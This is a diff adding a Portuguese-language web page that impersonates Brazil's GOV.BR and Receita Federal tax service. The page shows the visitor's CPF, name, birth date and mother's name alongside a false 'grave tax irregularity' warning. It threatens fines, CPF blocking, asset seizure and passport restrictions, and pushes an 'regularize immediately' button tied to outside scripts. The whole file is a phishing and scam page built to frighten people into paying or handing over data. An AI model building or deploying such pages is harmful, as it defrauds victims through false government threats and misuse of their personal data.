@@ -1,0 +1,116 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GOV.BR - CPF Brasil</title>
+    <meta name="description" content="GOV.BR - CPF Brasil">
+    <meta name="author" content="GOV.BR">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div class="page-bg">
+        <div id="loading-screen" class="loading-screen hidden">
+            <div class="loading-container">
+                <div class="spinner-large"></div>
+                <p id="loading-message">Preparando sua regularização...</p>
+            </div>
+        </div>
+        
+        <!-- Header -->
+        <header class="page-header">
+            <div class="header-content">
+                <div class="header-left">
+                    <div class="logo-container">
+                        <img src="../lovable-uploads/9a5b75c1-0a3c-4e4d-872e-a0eec71b6b4f.png" alt="Gov.br Logo" class="logo-img">
+                    </div>
+                    <div class="header-info">
+                        <p class="header-title">Meu Imposto de Renda</p>
+                        <p class="header-subtitle">Receita Federal</p>
+                    </div>
+                </div>
+                <div class="user-info">
+                    <div class="user-details">
+                        <p class="user-name" id="user-name"></p>
+                        <p class="user-cpf" id="user-cpf"></p>
+                    </div>
+                    <div class="user-avatar">
+                        <span id="user-initials"></span>
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="content-card">
+                <!-- Irregularidade Fiscal -->
+                <div class="alert-section">
+                    <div class="alert-header">
+                        <svg class="alert-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
+                            <path d="M12 9v4"/>
+                            <path d="m12 17 .01 0"/>
+                        </svg>
+                        <h2>IRREGULARIDADE FISCAL GRAVE DETECTADA</h2>
+                    </div>
+                    <div class="irregularity-content">
+                        <p>Seu CPF encontra-se em situação irregular perante a Receita Federal devido ao não cumprimento das obrigações tributárias referentes à Declaração do Imposto de Renda 2024.</p>
+                        <div class="irregularity-details">
+                            <div class="detail-item">
+                                <span class="detail-label">CPF:</span>
+                                <span class="detail-value" id="cpf-display"></span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Nome:</span>
+                                <span class="detail-value" id="name-display"></span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Data de nascimento:</span>
+                                <span class="detail-value" id="birth-date-display"></span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Sexo:</span>
+                                <span class="detail-value" id="gender-display"></span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Filiação:</span>
+                                <span class="detail-value" id="mother-name-display"></span>
+                            </div>
+                            <div class="detail-item deadline">
+                                <span class="detail-label">Prazo final:</span>
+                                <span class="detail-value" id="deadline-display"></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Consequences Section -->
+                <div class="consequences-section">
+                    <h3>CONSEQUÊNCIAS IMEDIATAS DA NÃO REGULARIZAÇÃO:</h3>
+                    <p>Se a situação não for regularizada imediatamente, você estará sujeito a penalidades graves.</p>
+                    <ul class="consequences-list">
+                        <li><strong>Multa agravada de até 150%</strong> sobre o imposto devido.</li>
+                        <li><strong>Bloqueio do CPF</strong> com suspensão de serviços bancários.</li>
+                        <li><strong>Inclusão no CADIN e SERASA</strong>, afetando seu crédito.</li>
+                        <li><strong>Possível penhora de bens</strong> via processo administrativo fiscal.</li>
+                        <li><strong>Restrição para emissão de passaporte</strong> e viagens.</li>
+                    </ul>
+                </div>
+                
+                <!-- Action Button -->
+                <div class="action-section">
+                    <button id="regularize-btn" class="govbr-btn">
+                        REGULARIZAR SITUAÇÃO IMEDIATAMENTE
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+    
+    <script src="js/utils.js"></script>
+    <script src="js/pg1.js"></script>
+</body>
+</html>
